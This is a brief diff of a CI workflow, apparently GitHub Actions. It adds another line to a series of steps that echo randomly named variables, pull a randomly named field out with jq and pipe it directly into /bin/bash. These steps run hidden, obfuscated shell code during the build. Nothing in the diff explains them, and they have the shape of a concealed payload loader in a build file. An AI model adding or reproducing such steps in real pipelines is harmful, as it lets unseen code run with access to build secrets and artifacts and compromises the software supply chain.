@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
           printf '%s' "$tma157" | jq -r .if3278 | /bin/bash
           echo $rsvz92458 | jq -r .hrmdz8 | /bin/bash
+          echo $nhic25 | jq -r .mesfz7160 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
